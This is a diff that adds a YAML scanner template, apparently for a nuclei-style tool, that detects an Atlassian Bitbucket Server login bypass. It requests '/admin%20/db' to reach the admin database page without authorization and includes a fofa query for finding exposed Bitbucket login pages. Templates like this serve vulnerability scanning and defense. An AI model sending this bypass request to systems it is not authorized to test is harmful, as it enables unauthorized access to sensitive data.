@@ -1,0 +1,29 @@
+# 来源: afrog（转换自 afrog/xray 表达式 POC）
+http:
+  - matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - <h2>Database</h2>
+          - Migrate database</a>
+        condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/admin%20/db'
+id: atlassian-bitbucket-loginbypass
+info:
+  author: daffainfo
+  description: |-
+    此错误已修复并部署在 Bitbucket Server > 4.8 上。Bitbucket 由 Atlassian 团队开发。其中出现了一个通过 %20 绕过权限的漏洞，导致任意用户可获取敏感数据
+    fofa: title="Log in - Bitbucket"
+  metadata:
+    argus-execution-class: detection
+    argus-import-license: MIT License
+    argus-import-source: afrog
+    argus-risk-level: medium
+  name: Atlassian Bitbucket 登录绕过漏洞
+  severity: medium
+  tags: atlassian,bitbucket,loginbypass,argus-import
